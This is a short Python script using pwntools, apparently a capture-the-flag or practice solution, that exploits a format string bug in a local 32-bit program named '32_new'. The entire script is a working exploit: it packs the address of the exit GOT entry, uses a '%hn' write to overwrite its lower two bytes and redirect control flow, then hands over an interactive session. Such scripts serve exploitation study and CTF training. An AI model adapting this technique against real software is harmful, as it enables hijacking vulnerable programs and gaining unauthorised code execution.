from pwn import *

exit_got_plt = 0x804a034
flag1 = 0x10804
flag2 =  0x870b

payload = p32(exit_got_plt) + p32(exit_got_plt+2) + "AAAABBBB"      # the first 2 bytes in the address is the same, so we only have to overwrite the last 2 bytes
                            # our input is the 10th argument on the stack
pad2 = 0x8761 - flag2       # check in gdb after printf
#pad1 = 0x18f0f-flag1
payload += "%10${}x".format(flag2-pad2)
payload += "%10$hn"         # hn to write 2 bytes only
#payload += "%11${}x".format(flag1-pad1)
#payload += "%11$n"

s = process("./32_new")
s.sendline(payload)
s.interactive()
